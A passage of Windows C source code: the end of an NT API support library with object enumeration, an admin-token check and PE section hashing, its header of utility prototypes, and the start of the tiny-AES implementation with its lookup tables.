    _In_opt_ HANDLE hRootDirectory,
    _In_ PENUMOBJECTSCALLBACK CallbackProc,
    _In_opt_ PVOID CallbackParam
)
{
    ULONG               ctx, rlen;
    HANDLE              hDirectory = NULL;
    NTSTATUS            status;
    NTSTATUS            CallbackStatus;
    OBJECT_ATTRIBUTES   attr;
    UNICODE_STRING      sname;

    POBJECT_DIRECTORY_INFORMATION    objinf;

    if (CallbackProc == NULL) {
        return STATUS_INVALID_PARAMETER_4;
    }

    status = STATUS_UNSUCCESSFUL;

    // We can use root directory.
    if (pwszRootDirectory != NULL) {
        RtlSecureZeroMemory(&sname, sizeof(sname));
        RtlInitUnicodeString(&sname, pwszRootDirectory);
        InitializeObjectAttributes(&attr, &sname, OBJ_CASE_INSENSITIVE, NULL, NULL);
        status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &attr);
        if (!NT_SUCCESS(status)) {
            return status;
        }
    }
    else {
        if (hRootDirectory == NULL) {
            return STATUS_INVALID_PARAMETER_2;
        }
        hDirectory = hRootDirectory;
    }

    // Enumerate objects in directory.
    ctx = 0;
    do {

        rlen = 0;
        status = NtQueryDirectoryObject(hDirectory, NULL, 0, TRUE, FALSE, &ctx, &rlen);
        if (status != STATUS_BUFFER_TOO_SMALL)
            break;

        objinf = (POBJECT_DIRECTORY_INFORMATION)ntsupHeapAlloc(rlen);
        if (objinf == NULL)
            break;

        status = NtQueryDirectoryObject(hDirectory, objinf, rlen, TRUE, FALSE, &ctx, &rlen);
        if (!NT_SUCCESS(status)) {
            ntsupHeapFree(objinf);
            break;
        }

        CallbackStatus = CallbackProc(objinf, CallbackParam);

        ntsupHeapFree(objinf);

        if (NT_SUCCESS(CallbackStatus)) {
            status = STATUS_SUCCESS;
            break;
        }

    } while (TRUE);

    if (hDirectory != NULL) {
        NtClose(hDirectory);
    }

    return status;
}

/*
* ntsupIsObjectExists
*
* Purpose:
*
* Return TRUE if the given object exists, FALSE otherwise.
*
*/
BOOLEAN ntsupIsObjectExists(
    _In_ LPCWSTR RootDirectory,
    _In_ LPCWSTR ObjectName
)
{
    OBJSCANPARAM Param;

    Param.Buffer = ObjectName;
    Param.BufferSize = (ULONG)_strlen(ObjectName);

    return NT_SUCCESS(ntsupEnumSystemObjects(RootDirectory, NULL, ntsupDetectObjectCallback, &Param));
}

/*
* ntsupUserIsFullAdmin
*
* Purpose:
*
* Tests if the current user is admin with full access token.
*
*/
BOOLEAN ntsupUserIsFullAdmin(
    VOID
)
{
    BOOLEAN  bResult = FALSE;
    HANDLE   hToken = NULL;
    NTSTATUS status;
    DWORD    i, Attributes;
    ULONG    ReturnLength = 0;

    PTOKEN_GROUPS pTkGroups;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup = NULL;

    hToken = ntsupGetCurrentProcessToken();
    if (hToken) {
        if (NT_SUCCESS(RtlAllocateAndInitializeSid(
            &NtAuthority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0,
            &AdministratorsGroup)))
        {
            status = ntsupQueryTokenInformation(hToken,
                TokenGroups,
                &pTkGroups,
                &ReturnLength,
                (PNTSUPMEMALLOC)ntsupHeapAlloc,
                (PNTSUPMEMFREE)ntsupHeapFree);

            if (NT_SUCCESS(status)) {

                for (i = 0; i < pTkGroups->GroupCount; i++) {

                    Attributes = pTkGroups->Groups[i].Attributes;

                    if (RtlEqualSid(AdministratorsGroup, pTkGroups->Groups[i].Sid))
                        if (
                            (Attributes & SE_GROUP_ENABLED) &&
                            (!(Attributes & SE_GROUP_USE_FOR_DENY_ONLY))
                            )
                        {
                            bResult = TRUE;
                            break;
                        }

                }

                ntsupHeapFree(pTkGroups);
            }
            RtlFreeSid(AdministratorsGroup);
        }

        NtClose(hToken);
    }
    return bResult;
}

/*
* ntsupHashImageSections
*
* Purpose:
*
* Produce a SHA-256 hash for a PE image mapping in memory (either a raw
* file mapping or a loaded module) by hashing the PE headers plus every
* executable section.
*
*/
NTSTATUS ntsupHashImageSections(
    _In_ PVOID ImageBase,
    _In_ SIZE_T ImageSize,          // Size of image mapping
    _Out_writes_bytes_(HashBufferSize) PBYTE HashBuffer,
    _In_ SIZE_T HashBufferSize,
    _In_ NTSUP_IMAGE_TYPE ImageType
)
{
    BOOL anySectionHashed;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER sectionHeader;
    ULONG numberOfSections, i;
    ULONG_PTR baseAddress = (ULONG_PTR)ImageBase;
    NTSUP_SHA256_CTX ctx;
    ULONG_PTR sectionStart, headersEnd;
    SIZE_T toHash, sizeOfHeaders, maxVirtualSize, maxRawSize, maxSafeSize;

    //
    // Validate parameters.
    //
    if (ImageBase == NULL || HashBuffer == NULL)
        return STATUS_INVALID_PARAMETER;

    if (HashBufferSize < NTSUPHASH_SHA256_SIZE)
        return STATUS_BUFFER_TOO_SMALL;

    if (ImageSize == 0)
        return STATUS_INVALID_PARAMETER;

    //
    // Get NT headers with boundary check.
    //
    if (!NT_SUCCESS(RtlImageNtHeaderEx(0,
        ImageBase,
        ImageSize,
        (PIMAGE_NT_HEADERS*)&ntHeaders)) || ntHeaders == NULL) 
    {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    if (ntHeaders->OptionalHeader.SizeOfImage == 0)
        return STATUS_INVALID_IMAGE_FORMAT;

    //
    // Validate image size matches reported size.
    //
    if (ntHeaders->OptionalHeader.SizeOfImage > ImageSize &&
        ImageType == ImageTypeLoaded) 
    {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    numberOfSections = ntHeaders->FileHeader.NumberOfSections;

    //
    // Validate section headers are within image bounds.
    //
    if (numberOfSections == 0 ||
        numberOfSections > (MAXULONG_PTR / sizeof(IMAGE_SECTION_HEADER)))
    {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    headersEnd = (ULONG_PTR)sectionHeader +
        (numberOfSections * sizeof(IMAGE_SECTION_HEADER));

    if (headersEnd < (ULONG_PTR)sectionHeader ||
        headersEnd > baseAddress + ImageSize)
    {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    ntsupSha256Init(&ctx);

    //
    // Hash PE headers first.
    //
    sizeOfHeaders = min(ntHeaders->OptionalHeader.SizeOfHeaders, ImageSize);
    if (sizeOfHeaders) {
        ntsupSha256Update(&ctx, (PUCHAR)ImageBase, sizeOfHeaders);
    }

    anySectionHashed = FALSE;

    //
    // Process each section.
    //
    for (i = 0; i < numberOfSections; i++, sectionHeader++) {
        // Only hash executable sections
        if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)
            continue;

        //
        // Determine section location based on image type.
        //
        if (ImageType == ImageTypeLoaded) {
            //
            // For loaded modules: use virtual addresses.
            //
            if (sectionHeader->VirtualAddress == 0 ||
                sectionHeader->Misc.VirtualSize == 0) {
                continue;
            }

            //
            // Skip sections outside loaded image.
            //
            if (sectionHeader->VirtualAddress >= ntHeaders->OptionalHeader.SizeOfImage) {
                continue;
            }

            maxVirtualSize = ntHeaders->OptionalHeader.SizeOfImage - sectionHeader->VirtualAddress;
            toHash = min(sectionHeader->Misc.VirtualSize, maxVirtualSize);
            sectionStart = baseAddress + sectionHeader->VirtualAddress;
        }
        else {
            //
            // For raw files: use file offsets.
            //
            if (sectionHeader->PointerToRawData == 0 ||
                sectionHeader->SizeOfRawData == 0) {
                continue;
            }

            //
            // Skip sections outside file.
            //
            if (sectionHeader->PointerToRawData >= ImageSize) {
                continue;
            }

            maxRawSize = ImageSize - sectionHeader->PointerToRawData;
            toHash = min(sectionHeader->SizeOfRawData, maxRawSize);
            sectionStart = baseAddress + sectionHeader->PointerToRawData;
        }

        if (sectionStart < baseAddress ||
            sectionStart >= baseAddress + ImageSize) 
        {
            continue;
        }

        maxSafeSize = (baseAddress + ImageSize) - sectionStart;
        if (toHash > maxSafeSize) {
            toHash = maxSafeSize;
        }

        ntsupSha256Update(&ctx, (PUCHAR)sectionStart, toHash);
        anySectionHashed = TRUE;
    }

    //
    // Return header-only hash if no executable sections found.
    //
    ntsupSha256Final(&ctx, HashBuffer);
    if (!anySectionHashed)
        return STATUS_NOT_FOUND;

    return STATUS_SUCCESS;
}

#pragma warning(pop)

```

`Source/Shared/ntos/ntsup.h`:

```h
/************************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2011 - 2025 UGN/HE
*
*  TITLE:       NTSUP.H
*
*  VERSION:     2.25
*
*  DATE:        18 Aug 2025
*
*  Common header file for the NT API support functions and definitions.
*
*  Depends on:    ntos.h
*                 minirtl
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
************************************************************************************/

#define ENABLE_C_EXTERN

#if defined (_MSC_VER) && (_MSC_VER >= 1020)
#pragma once
#endif

#ifndef NTSUP_RTL
#define NTSUP_RTL

#pragma warning(push)
#pragma warning(disable: 4201) // nameless struct/union
#pragma warning(disable: 4214) // nonstandard extension used : bit field types other than int
#pragma warning(disable: 26812) // enum type % is unscoped

#ifndef _WINDOWS_
#include <Windows.h>
#endif

#pragma warning(push)
#pragma warning(disable: 4005) //macro redefinition
#include <ntstatus.h>
#pragma warning(pop)

#include "ntos.h"

#define _NTDEF_
#include <ntsecapi.h>
#undef _NTDEF_

#include "minirtl/minirtl.h"

#ifdef ENABLE_C_EXTERN
#if defined(__cplusplus)
extern "C" {
#endif
#endif

typedef NTSTATUS(NTAPI* PFN_NTQUERYROUTINE)(
   _In_opt_ HANDLE ObjectHandle,
   _In_ DWORD InformationClass,
   _Out_writes_bytes_(ObjectInformationLength) PVOID ObjectInformation,
   _In_ ULONG ObjectInformationLength,
   _Out_opt_ PULONG ReturnLength);

typedef PVOID(CALLBACK* PNTSUPMEMALLOC)(
    _In_ SIZE_T NumberOfBytes);

typedef BOOL(CALLBACK* PNTSUPMEMFREE)(
    _In_ PVOID Memory);

#define ntsupProcessHeap() NtCurrentPeb()->ProcessHeap

#define NTSUPHASH_SHA256_SIZE 32

#define MAX_NTSUP_BUFFER_SIZE (512 * 1024 * 1024) //512MB
#define MAX_NTSUP_ENV_SCAN 4096
#define MAX_NTSUP_PROCESS_ENUM_ITER (1024 * 1024)
#define MAX_NTSUP_WRITE_CHUNK 0x7FFFFFFF

typedef struct _OBJSCANPARAM {
    PCWSTR Buffer;
    ULONG BufferSize;
} OBJSCANPARAM, * POBJSCANPARAM;

typedef NTSTATUS(NTAPI* PENUMOBJECTSCALLBACK)(
    _In_ POBJECT_DIRECTORY_INFORMATION Entry, 
    _In_opt_ PVOID CallbackParam);

typedef BOOL(CALLBACK* pfnPatternSearchCallback)(
    _In_ PBYTE Buffer,
    _In_ ULONG PatternSize,
    _In_opt_ PVOID CallbackContext
    );

typedef struct _PATTERN_SEARCH_PARAMS {
    PBYTE Buffer;
    DWORD BufferSize;
    PBYTE Pattern;
    DWORD PatternSize;
    PBYTE Mask;
    pfnPatternSearchCallback Callback;
    PVOID CallbackContext;
} PATTERN_SEARCH_PARAMS, * PPATTERN_SEARCH_PARAMS;

typedef enum _NTSUP_IMAGE_TYPE {
    ImageTypeRaw,       // Raw file mapping (CreateFileMapping)
    ImageTypeLoaded     // Loaded module (PEB/LdrEntry)
} NTSUP_IMAGE_TYPE;

PVOID ntsupHeapAlloc(
    _In_ SIZE_T Size);

VOID ntsupHeapFree(
    _In_ PVOID BaseAddress);

PVOID ntsupVirtualAllocEx(
    _In_ SIZE_T Size,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect);

PVOID ntsupVirtualAlloc(
    _In_ SIZE_T Size);

BOOL ntsupVirtualFree(
    _In_ PVOID Memory);

BOOL ntsupVirtualLock(
    _In_ LPVOID lpAddress,
    _In_ SIZE_T dwSize);

BOOL ntsupVirtualUnlock(
    _In_ LPVOID lpAddress,
    _In_ SIZE_T dwSize);

SIZE_T ntsupWriteBufferToFile(
    _In_ PCWSTR FileName,
    _In_ PVOID Buffer,
    _In_ SIZE_T Size,
    _In_ BOOL Flush,
    _In_ BOOL Append,
    _Out_opt_ NTSTATUS* Result);

PVOID ntsupGetModuleEntryByAddress(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ PVOID Address);

PVOID ntsupFindModuleEntryByName(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ LPCSTR ModuleName);

PVOID ntsupFindModuleEntryByName_U(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ LPCWSTR ModuleName);

BOOL ntsupFindModuleEntryByAddress(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ PVOID Address,
    _Out_ PULONG ModuleIndex);

PVOID ntsupFindModuleNameByAddress(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ PVOID Address,
    _Inout_	LPWSTR Buffer,
    _In_ DWORD ccBuffer);

NTSTATUS ntsupConvertToUnicode(
    _In_ LPCSTR AnsiString,
    _Inout_ PUNICODE_STRING UnicodeString);

NTSTATUS ntsupConvertToAnsi(
    _In_ LPCWSTR UnicodeString,
    _Inout_ PANSI_STRING AnsiString);

BOOLEAN ntsupEnablePrivilege(
    _In_ DWORD Privilege,
    _In_ BOOLEAN Enable);

HANDLE ntsupGetCurrentProcessToken(
    VOID);

ULONG_PTR ntsupQuerySystemRangeStart(
    VOID);

BOOLEAN ntsupQueryUserModeAccessibleRange(
    _Out_ PULONG_PTR MinimumUserModeAddress,
    _Out_ PULONG_PTR MaximumUserModeAddress);

BOOL ntsupIsProcess32bit(
    _In_ HANDLE hProcess);

PVOID ntsupGetLoadedModulesListEx(
    _In_ BOOL ExtendedOutput,
    _Out_opt_ PULONG ReturnLength,
    _In_ PNTSUPMEMALLOC AllocMem,
    _In_ PNTSUPMEMFREE FreeMem);

PVOID ntsupGetLoadedModulesList(
    _Out_opt_ PULONG ReturnLength);

PVOID ntsupGetLoadedModulesList2(
    _Out_opt_ PULONG ReturnLength);

PVOID ntsupGetSystemInfoEx(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_opt_ PULONG ReturnLength,
    _In_ PNTSUPMEMALLOC AllocMem,
    _In_ PNTSUPMEMFREE FreeMem);

PVOID ntsupGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI ntsupEnumSystemObjects(
    _In_opt_ LPCWSTR pwszRootDirectory,
    _In_opt_ HANDLE hRootDirectory,
    _In_ PENUMOBJECTSCALLBACK CallbackProc,
    _In_opt_ PVOID CallbackParam);

BOOL ntsupResolveSymbolicLink(
    _In_opt_ HANDLE RootDirectoryHandle,
    _In_ PUNICODE_STRING LinkName,
    _Inout_ LPWSTR Buffer,
    _In_ DWORD cbBuffer);

BOOL ntsupQueryThreadWin32StartAddress(
    _In_ HANDLE ThreadHandle,
    _Out_ PULONG_PTR Win32StartAddress);

_Success_(return)
NTSTATUS ntsupOpenDirectoryEx(
    _Out_ PHANDLE DirectoryHandle,
    _In_opt_ HANDLE RootDirectoryHandle,
    _In_ PUNICODE_STRING DirectoryName,
    _In_ ACCESS_MASK DesiredAccess);

NTSTATUS ntsupOpenDirectory(
    _Out_ PHANDLE DirectoryHandle,
    _In_opt_ HANDLE RootDirectoryHandle,
    _In_ LPCWSTR DirectoryName,
    _In_ ACCESS_MASK DesiredAccess);

BOOL ntsupQueryProcessName(
    _In_ ULONG_PTR dwProcessId,
    _In_ PVOID ProcessList,
    _Inout_ LPWSTR Buffer,
    _In_ DWORD ccBuffer);

BOOL ntsupQueryProcessEntryById(
    _In_ HANDLE UniqueProcessId,
    _In_ PVOID ProcessList,
    _Out_ PSYSTEM_PROCESS_INFORMATION* Entry);

NTSTATUS ntsupQueryProcessImageFileNameByProcessId(
    _In_ HANDLE UniqueProcessId,
    _Out_ PUNICODE_STRING ProcessImageFileName,
    _In_ PNTSUPMEMALLOC AllocMem,
    _In_ PNTSUPMEMFREE FreeMem);

NTSTATUS ntsupQuerySystemObjectInformationVariableSize(
    _In_ PFN_NTQUERYROUTINE QueryRoutine,
    _In_opt_ HANDLE ObjectHandle,
    _In_ DWORD InformationClass,
    _Out_ PVOID* Buffer,
    _Out_opt_ PULONG ReturnLength,
    _In_ PNTSUPMEMALLOC AllocMem,
    _In_ PNTSUPMEMFREE FreeMem);

BOOLEAN ntsupQueryVsmProtectionInformation(
    _Out_ PBOOLEAN pbDmaProtectionsAvailable,
    _Out_ PBOOLEAN pbDmaProtectionsInUse,
    _Out_ PBOOLEAN pbHardwareMbecAvailable,
    _Out_ PBOOLEAN pbApicVirtualizationAvailable);

BOOLEAN ntsupQueryHVCIState(
    _Out_ PBOOLEAN pbHVCIEnabled,
    _Out_ PBOOLEAN pbHVCIStrictMode,
    _Out_ PBOOLEAN pbHVCIIUMEnabled);

PVOID ntsupLookupImageSectionByName(
    _In_ CHAR* SectionName,
    _In_ ULONG SectionNameLength,
    _In_ PVOID DllBase,
    _Out_ PULONG SectionSize);

PVOID ntsupFindPattern(
    _In_ CONST PBYTE Buffer,
    _In_ SIZE_T BufferSize,
    _In_ CONST PBYTE Pattern,
    _In_ SIZE_T PatternSize);

DWORD ntsupFindPatternEx(
    _In_ PATTERN_SEARCH_PARAMS * SearchParams);

NTSTATUS ntsupOpenProcess(
    _In_ HANDLE UniqueProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

NTSTATUS ntsupOpenThread(
    _In_ PCLIENT_ID ClientId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ThreadHandle);

NTSTATUS ntsupCICustomKernelSignersAllowed(
    _Out_ PBOOLEAN bAllowed);

NTSTATUS ntsupPrivilegeEnabled(
    _In_ HANDLE ClientToken,
    _In_ ULONG Privilege,
    _Out_ LPBOOL pfResult);

LPWSTR ntsupQueryEnvironmentVariableOffset(
    _In_ PUNICODE_STRING Value);

DWORD ntsupExpandEnvironmentStrings(
    _In_ LPCWSTR lpSrc,
    _Out_writes_to_opt_(nSize, return) LPWSTR lpDst,
    _In_ DWORD nSize);

NTSTATUS ntsupIsLocalSystem(
    _Out_ PBOOL pbResult);

NTSTATUS ntsupIsUserHasInteractiveSid(
    _In_ HANDLE hToken,
    _Out_ PBOOL pbInteractiveSid);

BOOL ntsupGetProcessElevationType(
    _In_opt_ HANDLE ProcessHandle,
    _Out_ TOKEN_ELEVATION_TYPE * lpType);

NTSTATUS ntsupIsProcessElevated(
    _In_ ULONG ProcessId,
    _Out_ PBOOL Elevated);

VOID ntsupPurgeSystemCache(
    VOID);

PWSTR ntsupGetSystemRoot(
    VOID);

NTSTATUS ntsupGetProcessDebugObject(
    _In_ HANDLE ProcessHandle,
    _Out_ PHANDLE DebugObjectHandle);

PBYTE ntsupQueryResourceData(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize);

NTSTATUS ntsupEnableWow64Redirection(
    _In_ BOOLEAN bEnable);

BOOLEAN ntsupIsKdEnabled(
    _Out_opt_ PBOOLEAN DebuggerAllowed,
    _Out_opt_ PBOOLEAN DebuggerNotPresent);

BOOLEAN ntsupIsObjectExists(
    _In_ LPCWSTR RootDirectory,
    _In_ LPCWSTR ObjectName);

BOOLEAN ntsupUserIsFullAdmin(
    VOID);

NTSTATUS ntsupHashImageSections(
    _In_ PVOID ImageBase,
    _In_ SIZE_T ImageSize,
    _Out_writes_bytes_(HashBufferSize) PBYTE HashBuffer,
    _In_ SIZE_T HashBufferSize,
    _In_ NTSUP_IMAGE_TYPE ImageType);

#define ntsupQuerySecurityInformation(\
     ObjectHandle, SecurityInformationClass, Buffer, ReturnLength, AllocMem, FreeMem) \
ntsupQuerySystemObjectInformationVariableSize((PFN_NTQUERYROUTINE)NtQuerySecurityObject, \
     ObjectHandle, SecurityInformationClass, (PVOID*)Buffer, ReturnLength,\
    (PNTSUPMEMALLOC)AllocMem, (PNTSUPMEMFREE)FreeMem)

#define ntsupQueryTokenInformation(\
     TokenHandle, TokenInformationClass, Buffer, ReturnLength, AllocMem, FreeMem) \
ntsupQuerySystemObjectInformationVariableSize((PFN_NTQUERYROUTINE)NtQueryInformationToken, \
     TokenHandle, TokenInformationClass, (PVOID*)Buffer, ReturnLength,\
    (PNTSUPMEMALLOC)AllocMem, (PNTSUPMEMFREE)FreeMem)

#define ntsupQueryObjectInformation(\
     ObjectHandle, ObjectInformationClass, Buffer, ReturnLength, AllocMem, FreeMem) \
ntsupQuerySystemObjectInformationVariableSize((PFN_NTQUERYROUTINE)NtQueryObject, \
    ObjectHandle, ObjectInformationClass, (PVOID*)Buffer, ReturnLength, \
    (PNTSUPMEMALLOC)AllocMem, (PNTSUPMEMFREE)FreeMem)

#define ntsupQueryThreadInformation(\
    ThreadHandle, ThreadInformationClass, Buffer, ReturnLength, AllocMem, FreeMem) \
ntsupQuerySystemObjectInformationVariableSize((PFN_NTQUERYROUTINE)NtQueryInformationThread, \
    ThreadHandle, ThreadInformationClass, (PVOID*)Buffer, ReturnLength, \
    (PNTSUPMEMALLOC)AllocMem, (PNTSUPMEMFREE)FreeMem)

#define ntsupQueryProcessInformation(\
    ProcessHandle, ProcessInformationClass, Buffer, ReturnLength, AllocMem, FreeMem)\
ntsupQuerySystemObjectInformationVariableSize((PFN_NTQUERYROUTINE)NtQueryInformationProcess, \
    ProcessHandle, ProcessInformationClass, (PVOID*)Buffer, ReturnLength, \
    (PNTSUPMEMALLOC)AllocMem, (PNTSUPMEMFREE)FreeMem)


#ifdef ENABLE_C_EXTERN
#ifdef __cplusplus
}
#endif
#endif

#pragma warning(pop)

#endif NTSUP_RTL

```

`Source/Shared/thirdparty/tinyaes/aes.c`:

```c
/*

This is an implementation of the AES algorithm, specifically ECB, CTR and CBC mode.
Block size can be chosen in aes.h - available choices are AES128, AES192, AES256.

The implementation is verified against the test vectors in:
  National Institute of Standards and Technology Special Publication 800-38A 2001 ED

ECB-AES128
----------

  plain-text:
    6bc1bee22e409f96e93d7e117393172a
    ae2d8a571e03ac9c9eb76fac45af8e51
    30c81c46a35ce411e5fbc1191a0a52ef
    f69f2445df4f9b17ad2b417be66c3710

  key:
    2b7e151628aed2a6abf7158809cf4f3c

  resulting cipher
    3ad77bb40d7a3660a89ecaf32466ef97 
    f5d3d58503b9699de785895a96fdbaaf 
    43b1cd7f598ece23881b00e3ed030688 
    7b0c785e27e8ad3f8223207104725dd4 


NOTE:   String length must be evenly divisible by 16byte (str_len % 16 == 0)
        You should pad the end of the string with zeros if this is not the case.
        For AES192/256 the key size is proportionally larger.

*/


/*****************************************************************************/
/* Includes:                                                                 */
/*****************************************************************************/
#include <string.h> // CBC mode, for memset
#include "aes.h"

/*****************************************************************************/
/* Defines:                                                                  */
/*****************************************************************************/
// The number of columns comprising a state in AES. This is a constant in AES. Value=4
#define Nb 4

#if defined(AES256) && (AES256 == 1)
    #define Nk 8
    #define Nr 14
#elif defined(AES192) && (AES192 == 1)
    #define Nk 6
    #define Nr 12
#else
    #define Nk 4        // The number of 32 bit words in a key.
    #define Nr 10       // The number of rounds in AES Cipher.
#endif

// jcallan@github points out that declaring Multiply as a function 
// reduces code size considerably with the Keil ARM compiler.
// See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3
#ifndef MULTIPLY_AS_A_FUNCTION
  #define MULTIPLY_AS_A_FUNCTION 0
#endif




/*****************************************************************************/
/* Private variables:                                                        */
/*****************************************************************************/
// state - array holding the intermediate results during decryption.
typedef uint8_t state_t[4][4];



// The lookup-tables are marked const so they can be placed in read-only storage instead of RAM
// The numbers below can be computed dynamically trading ROM for RAM - 
// This can be useful in (embedded) bootloader applications, where ROM is often limited.
static const uint8_t sbox[256] = {
  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
  0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
  0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
  0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
  0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
  0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
  0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
  0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
  0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
  0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
  0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
  0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
  0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
  0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
  0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
  0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
  0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 };

static const uint8_t rsbox[256] = {
  0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
  0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
  0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
  0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
  0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
  0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
  0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
  0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
  0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
  0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
  0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
  0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
  0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
  0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
  0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
